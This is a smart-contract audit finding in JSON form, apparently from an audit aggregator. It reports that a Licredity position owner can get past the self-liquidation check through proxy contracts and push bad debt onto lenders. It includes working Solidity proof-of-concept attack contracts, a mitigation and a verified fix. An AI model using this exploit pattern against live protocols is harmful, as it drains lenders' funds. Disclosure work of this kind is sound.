{
    "id": 62347,
    "kind": "MARKDOWN",
    "auditfirm_id": 11,
    "impact": "HIGH",
    "finders_count": 3,
    "protocol_id": 3402,
    "title": "Proxy-Based self-liquidation creates bad debt for lenders",
    "content": "**Description:** When calling [`Licredity::seize`](https://github.com/Licredity/licredity-v1-core/blob/e8ae10a7d9f27529e39ca277bf56cef01a807817/src/Licredity.sol#L550-L558) to liquidate an unhealthy position, the contract checks that the position owner is not the caller:\n\n```solidity\n// prevents owner from purposely causing a position to be underwater then profit from seizing it\n// side effect is that positions cannot be seized by owner contract, such as non-fungible position manager, which is acceptable\nif (position.owner == msg.sender) {\n    assembly (\"memory-safe\") {\n        mstore(0x00, 0x7c474390) // 'CannotSeizeOwnPosition()'\n        revert(0x1c, 0x04)\n    }\n}\n```\n\nThis check can be bypassed by calling `seize` through a separate contract. The position owner orchestrates the liquidation via a helper (“proxy”) contract so that `msg.sender` in `Licredity::seize` is the proxy, not the owner. Using `Licredity::unlock` and its callback, the attacker can open and under-collateralize a position and immediately self-liquidate it in the same transaction, socializing the loss to lenders.\n\n**Impact:** The owner can liquidate their own under-collateralized position and capture the liquidator bonus, while pushing the shortfall onto lenders/the protocol. This can be performed atomically, repeated to farm incentives, and scaled up to available liquidity and configuration limits. No price movement is required, making it a practical drain of protocol value.\n\n**Proof of Concept:** Add the following test to `LicreditySeize.t.sol`. It shows how an attacker can deploy an `AttackerRouter` and `AttackerSeizer` to open an unhealthy position and immediately self-liquidate it in the same `unlock` call:\n```solidity\nfunction test_seize_ownPosition_using_external_contract() public {\n    /// open large position for existing lenders\n    uint256 positionId = licredityRouter.open();\n    token.mint(address(this), 10 ether);\n    token.approve(address(licredityRouter), 10 ether);\n\n    licredityRouter.depositFungible(positionId, Fungible.wrap(address(token)), 10 ether);\n\n    uint128 borrowAmount = 9 ether;\n    (uint256 totalShares, uint256 totalAssets) = licredity.getTotalDebt();\n    uint256 delta = borrowAmount.toShares(totalAssets, totalShares);\n\n    licredityRouterHelper.addDebt(positionId, delta, address(1));\n\n    // Attacker deploys router and helper contract to seize the position\n    AttackerSeizer seizer = new AttackerSeizer(licredity);\n    AttackerRouter attackerRouter = new AttackerRouter(licredity, token, seizer);\n\n    // attack commences\n    attackerRouter.depositFungible(0.5 ether);\n}\n```\nAnd add these two contracts used:\n```solidity\ncontract AttackerRouter {\n    using StateLibrary for Licredity;\n    using ShareMath for uint128;\n\n    Licredity public licredity;\n    BaseERC20Mock public token;\n    AttackerSeizer public seizer;\n\n    constructor(Licredity _licredity, BaseERC20Mock _token, AttackerSeizer _seizer) {\n        licredity = _licredity;\n        token = _token;\n        seizer = _seizer;\n    }\n\n    function depositFungible(uint256 amount) external {\n        // 1. add some collateral to the position\n        //    so that it can become healthy after seize\n        uint256 positionId = licredity.open();\n        licredity.stageFungible(Fungible.wrap(address(token)));\n        token.mint(address(licredity), amount);\n        licredity.depositFungible(positionId);\n\n        // 2. call unlock to take on debt and seize\n        licredity.unlock(abi.encode(positionId));\n        // 5. as `unlock` doesn't revert, the position has become healthy\n    }\n\n    function unlockCallback(bytes calldata data) public returns (bytes memory) {\n        uint256 positionId = abi.decode(data, (uint256));\n\n        // 3. increase debt share to make the position unhealthy\n        uint128 borrowAmount = 1 ether;\n        (uint256 totalShares, uint256 totalAssets) = licredity.getTotalDebt();\n        uint256 delta = borrowAmount.toShares(totalAssets, totalShares);\n        licredity.increaseDebtShare(positionId, delta, address(this));\n\n        // 4. use the separate seizer contract to seize the position\n        //    making it healthy again.\n        seizer.seize(positionId);\n\n        return new bytes(0);\n    }\n}\n\ncontract AttackerSeizer {\n    Licredity public licredity;\n\n    constructor(Licredity _licredity) {\n        licredity = _licredity;\n    }\n\n    function seize(uint256 positionId) external {\n        licredity.seize(positionId, msg.sender);\n    }\n}\n```\n\n**Recommended Mitigation:** In addition to enforcing `position.owner != msg.sender`, constrain `seize` so it must be the first operation in an `unlock` execution. As the `Locker` library already tracks if the position has been touched before, it can expose this to `seize`. And if the position has been touched, revert. This mirrors the approach used by Euler’s EVC/EVK combo to block atomic “create/borrow/self-liquidate” flows ([code](https://github.com/euler-xyz/euler-vault-kit/blob/master/src/EVault/modules/Liquidation.sol#L93-L95)).\n\n**Licredity:** Fixed in [PR#57](https://github.com/Licredity/licredity-v1-core/pull/57/files), commit [`e9490bb`](https://github.com/Licredity/licredity-v1-core/commit/e9490bb3f82fdd829288a76af5d421c10570e6ba)\n\n**Cyfrin:** Verified. `seize` now checks that there are no prior registrations of the same position in `Locker`.",
    "summary": "\nThe bug report describes a vulnerability in the Licredity contract that allows the owner of a position to exploit the system and profit at the expense of lenders. This can be done by using a separate contract to call the `seize` function, bypassing the check that prevents the owner from seizing their own position. This can be repeated to farm incentives and cause a loss for the protocol. A proof of concept is provided, along with a recommended mitigation to fix the issue. The bug has been fixed in the latest version of the contract.",
    "report_date": "2025-09-01T00:00:00.000Z",
    "contest_prize_txt": "",
    "contest_link": "",
    "sponsor_name": null,
    "sponsor_link": "",
    "quality_score": 0,
    "general_score": 0,
    "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-09-01-cyfrin-licredity-v2.0.md",
    "github_link": "",
    "pdf_link": "",
    "pdf_page_from": 0,
    "contest_id": "",
    "slug": "proxy-based-self-liquidation-creates-bad-debt-for-lenders-cyfrin-none-licredity-markdown",
    "firm_name": "Cyfrin",
    "firm_logo_square": "Cyfrin_square.jpg",
    "protocol_name": "Licredity",
    "bookmarked": false,
    "read": false,
    "issues_issue_finders": [
        {
            "wardens_warden": {
                "handle": "Immeas"
            }
        },
        {
            "wardens_warden": {
                "handle": "Alexzoid"
            }
        },
        {
            "wardens_warden": {
                "handle": "ChainDefenders](https://x.com/ChDefendersEth) ([0x539](https://x.com/1337web3) & [PeterSR"
            }
        }
    ],
    "auditfirms_auditfirm": {
        "name": "Cyfrin",
        "logo_square": "Cyfrin_square.jpg"
    },
    "protocols_protocol": {
        "name": "Licredity",
        "protocols_protocolcategoryscore": []
    },
    "issues_issuetagscore": []
}